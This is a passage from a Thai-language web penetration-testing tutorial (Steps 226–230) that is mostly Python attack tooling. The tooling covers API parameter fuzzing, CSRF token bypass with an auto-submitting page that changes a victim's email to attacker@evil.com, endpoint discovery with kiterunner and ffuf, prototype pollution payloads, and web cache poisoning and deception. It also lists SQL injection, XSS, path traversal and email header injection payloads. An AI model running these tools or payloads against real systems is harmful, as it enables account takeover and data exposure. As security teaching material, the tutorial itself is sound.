                    print(f"[!] No pagination - returned {len(data)} items")
                elif isinstance(data, dict):
                    sensitive_fields = ['password', 'hash', 'secret', 'key', 'token']
                    found = [f for f in sensitive_fields if f in str(data).lower()]
                    if found:
                        print(f"[!] Sensitive fields: {found}")
            except:
                pass
    
    def fuzz_api_parameters(self, endpoint, method='GET'):
        """Fuzz API parameters"""
        print(f"[*] Fuzzing API parameters on {endpoint}...")
        
        fuzz_payloads = [
            "' OR '1'='1",
            '<script>alert(1)</script>',
            '../../../etc/passwd',
            '${7*7}',
            'null',
            '[]',
            '{}',
            '-1',
            '9999999999',
            '%00',
            '\x00'
        ]
        
        common_params = ['id', 'user', 'file', 'path', 'url', 'search', 'query']
        
        for param, payload in product(common_params, fuzz_payloads[:5]):
            if method == 'GET':
                resp = self.session.get(
                    f'{self.base_url}{endpoint}',
                    params={param: payload}
                )
            else:
                resp = self.session.post(
                    f'{self.base_url}{endpoint}',
                    json={param: payload}
                )
            
            # ตรวจสอบ error responses ที่น่าสนใจ
            if resp.status_code == 500:
                print(f"[!] Server error with {param}={payload[:30]}")
            elif 'error' in resp.text.lower() and len(resp.text) > 100:
                if any(x in resp.text.lower() for x in ['sql', 'syntax', 'traceback', 'exception']):
                    print(f"[!] Interesting error with {param}={payload[:30]}: {resp.text[:200]}")
    
    def test_rate_limiting(self, endpoint, method='GET', threshold=100):
        """ทดสอบ rate limiting"""
        print("[*] Testing rate limiting...")
        
        success_count = 0
        for i in range(threshold + 10):
            resp = self.session.request(method, f'{self.base_url}{endpoint}')
            if resp.status_code in [200, 201, 204]:
                success_count += 1
            elif resp.status_code == 429:
                print(f"[+] Rate limiting triggered after {i+1} requests")
                return
        
        if success_count > threshold:
            print(f"[!] No rate limiting - {success_count} successful requests")

# การใช้งาน
if __name__ == '__main__':
    tester = RESTAPISecurityTester(
        base_url='https://api.example.com',
        auth_header={'Authorization': 'Bearer TOKEN_HERE'}
    )
    
    tester.test_http_methods('/api/users/1')
    tester.test_idor('/api/users/{id}', valid_id=5)
    tester.test_api_versioning_issues()
    tester.fuzz_api_parameters('/api/search')
    tester.test_rate_limiting('/api/auth/login', method='POST')
```

---

## Step 227: Advanced CSRF Attacks

### Advanced CSRF Testing
```python
#!/usr/bin/env python3
# csrf_advanced_tester.py

import requests
import re

class AdvancedCSRFTester:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.verify = False
    
    def extract_csrf_token(self, page_url):
        """ดึง CSRF token จาก page"""
        resp = self.session.get(page_url)
        
        patterns = [
            r'<input[^>]*name=["\']csrf[_-]?token["\'][^>]*value=["\']([^"\'>]+)',
            r'<meta[^>]*name=["\']csrf[_-]?token["\'][^>]*content=["\']([^"\'>]+)',
            r'_token["\']\s*:\s*["\']([^"\']+)',
            r'csrf_token["\']\s*=\s*["\']([^"\']+)'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, resp.text, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    
    def test_token_bypass_techniques(self, protected_endpoint, csrf_token):
        """ทดสอบ CSRF bypass techniques"""
        print("[*] Testing CSRF bypass techniques...")
        
        test_data = {'action': 'test', 'value': 'bypass_test'}
        
        # Technique 1: Remove token entirely
        resp = self.session.post(protected_endpoint, data=test_data)
        if resp.status_code in [200, 302]:
            print("[!] CSRF bypass: No token required")
        
        # Technique 2: Empty token
        test_data['csrf_token'] = ''
        resp = self.session.post(protected_endpoint, data=test_data)
        if resp.status_code in [200, 302]:
            print("[!] CSRF bypass: Empty token accepted")
        
        # Technique 3: Invalid token
        test_data['csrf_token'] = 'INVALID_TOKEN_12345'
        resp = self.session.post(protected_endpoint, data=test_data)
        if resp.status_code in [200, 302]:
            print("[!] CSRF bypass: Invalid token accepted")
        
        # Technique 4: Change Content-Type
        headers = {'Content-Type': 'text/plain'}
        test_data_str = 'action=test&value=bypass'
        resp = self.session.post(protected_endpoint, data=test_data_str, headers=headers)
        if resp.status_code in [200, 302]:
            print("[!] CSRF bypass: Content-Type bypass worked")
        
        # Technique 5: JSON request
        headers = {'Content-Type': 'application/json'}
        resp = self.session.post(
            protected_endpoint,
            json={'action': 'test'},
            headers=headers
        )
        if resp.status_code in [200, 302]:
            print("[!] CSRF bypass: JSON request without token accepted")
    
    def test_token_reuse(self, protected_endpoint, csrf_token):
        """ทดสอบว่า token ใช้ซ้ำได้หรือไม่"""
        print("[*] Testing CSRF token reuse...")
        
        for i in range(3):
            resp = self.session.post(
                protected_endpoint,
                data={'action': 'test', 'csrf_token': csrf_token}
            )
            print(f"[*] Attempt {i+1}: {resp.status_code}")
            
            if i > 0 and resp.status_code in [200, 302]:
                print("[!] Token reuse possible - CSRF protection bypass")
    
    def generate_csrf_poc(self, target_url, params, method='POST'):
        """สร้าง CSRF PoC HTML"""
        form_inputs = '\n'.join(
            f'    <input type="hidden" name="{k}" value="{v}">'
            for k, v in params.items()
        )
        
        poc = f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body onload="document.forms[0].submit()">
<h1>CSRF Proof of Concept</h1>
<form action="{target_url}" method="{method}">
{form_inputs}
    <input type="submit" value="Click me">
</form>
</body>
</html>"""
        return poc

# ตัวอย่างการสร้าง CSRF PoC
tester = AdvancedCSRFTester('https://target.example.com')
poc_html = tester.generate_csrf_poc(
    target_url='https://target.example.com/api/user/change-email',
    params={
        'email': 'attacker@evil.com',
        'confirm_email': 'attacker@evil.com'
    }
)
print(poc_html)
```

---

## Step 228: API Fuzzing และ Discovery

### API Fuzzer
```python
#!/usr/bin/env python3
# api_fuzzer.py

import requests
import json
import threading
from queue import Queue

class APIFuzzer:
    def __init__(self, base_url, wordlist_path=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.discovered = []
        self.wordlist = wordlist_path
    
    def fuzz_endpoints(self, prefixes=None):
        """Fuzz API endpoints"""
        if prefixes is None:
            prefixes = [
                '/api', '/api/v1', '/api/v2', '/v1', '/v2',
                '/rest', '/graphql', '/rpc'
            ]
        
        common_endpoints = [
            'users', 'user', 'admin', 'login', 'logout', 'auth',
            'profile', 'settings', 'config', 'health', 'status',
            'metrics', 'logs', 'files', 'upload', 'download',
            'search', 'products', 'orders', 'payments', 'keys',
            'tokens', 'webhooks', 'integrations', 'export', 'import'
        ]
        
        print("[*] Fuzzing API endpoints...")
        
        queue = Queue()
        
        for prefix in prefixes:
            for endpoint in common_endpoints:
                queue.put(f"{prefix}/{endpoint}")
        
        def worker():
            while not queue.empty():
                path = queue.get()
                try:
                    resp = self.session.get(
                        f"{self.base_url}{path}",
                        timeout=5,
                        allow_redirects=False
                    )
                    
                    if resp.status_code not in [404, 400, 410]:
                        print(f"[+] {resp.status_code} {path} ({len(resp.content)} bytes)")
                        self.discovered.append({
                            'path': path,
                            'status': resp.status_code,
                            'size': len(resp.content)
                        })
                except:
                    pass
                finally:
                    queue.task_done()
        
        threads = [threading.Thread(target=worker) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        return self.discovered
    
    def fuzz_parameters(self, endpoint):
        """Fuzz parameters บน endpoint ที่พบ"""
        print(f"[*] Fuzzing parameters on {endpoint}...")
        
        param_wordlist = [
            'id', 'user_id', 'userId', 'uid', 'uuid',
            'token', 'key', 'api_key', 'apikey',
            'file', 'filename', 'path', 'filepath',
            'url', 'redirect', 'next', 'return',
            'debug', 'test', 'admin', 'role',
            'callback', 'format', 'type', 'action'
        ]
        
        for param in param_wordlist:
            resp = self.session.get(
                f"{self.base_url}{endpoint}",
                params={param: 'test'}
            )
            
            # ตรวจสอบว่า param มีผลกับ response
            base_resp = self.session.get(f"{self.base_url}{endpoint}")
            
            if resp.status_code != base_resp.status_code or \
               len(resp.content) != len(base_resp.content):
                print(f"[!] Parameter affects response: {param}")
    
    def fuzz_json_body(self, endpoint, method='POST'):
        """Fuzz JSON request body"""
        print(f"[*] Fuzzing JSON body on {endpoint}...")
        
        test_bodies = [
            {},  # empty
            {'admin': True},
            {'role': 'admin'},
            {'debug': True},
            {'__proto__': {'admin': True}},  # prototype pollution
            {'constructor': {'prototype': {'admin': True}}},
            {'id': '1 UNION SELECT 1,2,3--'},
            {'email': 'a@a.com\n\nBcc: evil@evil.com'},  # email header injection
        ]
        
        for body in test_bodies:
            resp = self.session.request(
                method,
                f"{self.base_url}{endpoint}",
                json=body
            )
            print(f"[*] {json.dumps(body)}: {resp.status_code}")

# การใช้งาน
if __name__ == '__main__':
    fuzzer = APIFuzzer('https://target.example.com')
    discovered = fuzzer.fuzz_endpoints()
    
    for endpoint in discovered:
        fuzzer.fuzz_parameters(endpoint['path'])
```

### API Discovery ด้วย Tools
```bash
# kiterunner - API endpoint discovery
git clone https://github.com/assetnote/kiterunner
cd kiterunner && make build

# ใช้ kiterunner
kr scan https://target.example.com -w /path/to/apis.kite
kr scan https://target.example.com -w routes-large.kite --ignore-length 34

# เพิ่ม authentication
kr scan https://target.example.com -w apis.kite \
  -H 'Authorization: Bearer TOKEN'

# ffuf สำหรับ API fuzzing
ffuf -u https://target.example.com/api/FUZZ \
  -w /usr/share/wordlists/api_wordlist.txt \
  -mc 200,201,301,302 \
  -H 'Authorization: Bearer TOKEN'

# nuclei templates สำหรับ API
nuclei -u https://target.example.com \
  -t /root/nuclei-templates/exposures/apis/
```

---

## Step 229: Prototype Pollution และ Client-Side Attacks

### Prototype Pollution Testing
```python
#!/usr/bin/env python3
# prototype_pollution_tester.py

import requests

class PrototypePollutionTester:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.verify = False
    
    def test_server_side_prototype_pollution(self, endpoint):
        """ทดสอบ Server-Side Prototype Pollution (SSPP)"""
        print("[*] Testing Server-Side Prototype Pollution...")
        
        # Payloads สำหรับ SSPP
        payloads = [
            {'__proto__': {'admin': True}},
            {'__proto__': {'polluted': 'yes'}},
            {'constructor': {'prototype': {'admin': True}}},
            {'__proto__[admin]': True},
            # JSON merge patch
            {'__proto__': {'isAdmin': True, 'role': 'admin'}}
        ]
        
        for payload in payloads:
            resp = self.session.post(
                f'{self.target}{endpoint}',
                json=payload
            )
            
            # ตรวจสอบ verbose error
            if 'prototype' in resp.text.lower() or \
               'polluted' in resp.text.lower():
                print(f"[!] Possible SSPP with: {payload}")
            
            # ตรวจสอบ behavior change
            check_resp = self.session.get(f'{self.target}/api/user/me')
            if 'admin' in str(check_resp.json()).lower() or \
               check_resp.json().get('admin') == True:
                print("[!] SSPP CONFIRMED: admin=true in response")
    
    def test_client_side_prototype_pollution(self):
        """สร้าง payload สำหรับ Client-Side Prototype Pollution"""
        print("[*] Client-Side Prototype Pollution payloads:")
        
        # URL-based CSPP
        cspp_urls = [
            '?__proto__[admin]=1',
            '?__proto__[innerHTML]=<img/src/onerror=alert(1)>',
            '?constructor[prototype][admin]=1',
            '#__proto__[admin]=1'
        ]
        
        for payload in cspp_urls:
            print(f"  URL: {self.target}{payload}")
        
        # ทดสอบ URL-based
        for payload in cspp_urls:
            resp = self.session.get(f'{self.target}{payload}')
            if 'admin' in resp.text:
                print(f"[!] Possible CSPP with URL payload: {payload}")

# JavaScript Prototype Pollution PoC
cspp_poc = """
// Client-side prototype pollution PoC
// ถ้า app ใช้ merge function ที่ vulnerable:

function merge(target, source) {
    for (let key of Object.keys(source)) {
        if (typeof source[key] === 'object') {
            if (target[key] === undefined) target[key] = {};
            merge(target[key], source[key]);  // recursive merge - VULNERABLE
        } else {
            target[key] = source[key];
        }
    }
}

// Attack:
const maliciousPayload = JSON.parse('{"__proto__":{"admin":true}}');
merge({}, maliciousPayload);
console.log({}.admin);  // true - prototype polluted!
"""
print("\n[*] JavaScript CSPP PoC:")
print(cspp_poc)
```

---

## Step 230: Web Cache Poisoning

### Web Cache Poisoning Testing
```python
#!/usr/bin/env python3
# cache_poisoning_tester.py

import requests
import hashlib
import time

class CachePoisoningTester:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.verify = False
    
    def find_cache_headers(self, url):
        """ค้นหา cache-related headers"""
        resp = self.session.get(url)
        
        cache_headers = {
            'Cache-Control': resp.headers.get('Cache-Control', ''),
            'X-Cache': resp.headers.get('X-Cache', ''),
            'X-Cache-Hit': resp.headers.get('X-Cache-Hit', ''),
            'Age': resp.headers.get('Age', ''),
            'Vary': resp.headers.get('Vary', ''),
            'ETag': resp.headers.get('ETag', ''),
            'CF-Cache-Status': resp.headers.get('CF-Cache-Status', ''),
            'X-Varnish': resp.headers.get('X-Varnish', '')
        }
        
        print("[*] Cache headers:")
        for k, v in cache_headers.items():
            if v:
                print(f"  {k}: {v}")
        
        return cache_headers
    
    def test_unkeyed_headers(self, url):
        """ค้นหา unkeyed headers ที่สามารถ poison cache ได้"""
        print("[*] Testing unkeyed headers for cache poisoning...")
        
        # Headers ที่อาจเป็น unkeyed
        test_headers = [
            ('X-Forwarded-Host', 'evil.com'),
            ('X-Host', 'evil.com'),
            ('X-Forwarded-Scheme', 'http'),
            ('X-Forwarded-Proto', 'http'),
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
            ('Forwarded', 'host=evil.com'),
        ]
        
        # ดึง baseline response
        base = self.session.get(url)
        
        for header_name, header_value in test_headers:
            resp = self.session.get(url, headers={header_name: header_value})
            
            # ตรวจสอบว่า header มีผลต่อ response
            if header_value in resp.text:
                print(f"[!] Unkeyed header found: {header_name}: {header_value}")
                print(f"    Header value reflected in response!")
            
            if resp.text != base.text and len(resp.text) != len(base.text):
                print(f"[!] Response changed with {header_name}: {header_value}")
    
    def test_fat_get_poison(self, url):
        """ทดสอบ fat GET request cache poisoning"""
        print("[*] Testing fat GET cache poisoning...")
        
        # ส่ง GET request พร้อม body
        resp = self.session.request(
            'GET',
            url,
            data={'param': 'poisoned_value'},
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        
        if 'poisoned_value' in resp.text:
            print("[!] Fat GET parameter reflected - cache poisoning possible")
    
    def attempt_cache_deception(self, authenticated_endpoint):
        """ทดสอบ Web Cache Deception"""
        print("[*] Testing Web Cache Deception...")
        print("""
        Web Cache Deception:
        1. Attacker lures victim to visit:
           https://target.com/profile/nonexistent.css
        2. Cache stores response (thinking it's CSS)
        3. Attacker visits same URL without auth
        4. Cache serves victim's profile data
        """)
        
        # ทดสอบ path extensions
        deceptive_paths = [
            f'{authenticated_endpoint}/test.css',
            f'{authenticated_endpoint}/style.css',
            f'{authenticated_endpoint}/img.jpg',
            f'{authenticated_endpoint}/data.json',
            f'{authenticated_endpoint}/file.js'
        ]
        
        for path in deceptive_paths:
            resp = self.session.get(f'{self.target}{path}')
            
            if resp.status_code == 200:
                cache_status = resp.headers.get('X-Cache', resp.headers.get('CF-Cache-Status', ''))
                print(f"[*] {path}: {resp.status_code} (cache: {cache_status})")
                
                if 'miss' in cache_status.lower():
                    # รอให้ cache
                    time.sleep(1)
                    resp2 = self.session.get(
                        f'{self.target}{path}',
                        headers={'Cookie': ''}  # no auth
                    )
                    if resp2.status_code == 200 and len(resp2.content) == len(resp.content):
                        print(f"[!] Web Cache Deception possible: {path}")
    
    def test_cache_key_injection(self, url):
        """ทดสอบ cache key injection"""
        print("[*] Testing cache key injection...")
        
        # ทดสอบ query parameter cloaking
        test_params = [
            'utm_source=evil',
            'fbclid=evil',
            '_=12345',
            'cachebust=12345'
        ]
        
        base_resp = self.session.get(url)
        
        for param in test_params:
            resp = self.session.get(f'{url}?{param}')
            
            if resp.text == base_resp.text:
                print(f"[*] Parameter excluded from cache key: {param}")
                print(f"    Potential cache poisoning via parameter injection")

# การใช้งาน
if __name__ == '__main__':
    tester = CachePoisoningTester('https://target.example.com')
    
    tester.find_cache_headers('https://target.example.com/')
    tester.test_unkeyed_headers('https://target.example.com/')
    tester.test_fat_get_poison('https://target.example.com/')
    tester.attempt_cache_deception('/api/user/profile')
    tester.test_cache_key_injection('https://target.example.com/')
```

---

## สรุป Part 23

| Step | หัวข้อ | เครื่องมือหลัก |
|------|--------|---------------|
| 221 | OAuth 2.0 Security | jwt_tool, custom tester |
| 222 | GraphQL Security | GraphQL Cop, InQL |
| 223 | WebSocket Security | websockets, Burp Suite |
| 224 | CORS Exploitation | Custom tester |
| 225 | Business Logic | Custom framework |
| 226 | REST API Security | Custom fuzzer |
| 227 | Advanced CSRF | PoC generator |
| 228 | API Fuzzing | kiterunner, ffuf |
| 229 | Prototype Pollution | Custom tester |
| 230 | Cache Poisoning | Custom tester |

## แหล่งเรียนรู้เพิ่มเติม
- PortSwigger Web Security Academy
- OWASP API Security Top 10
- HackTricks - Web Hacking
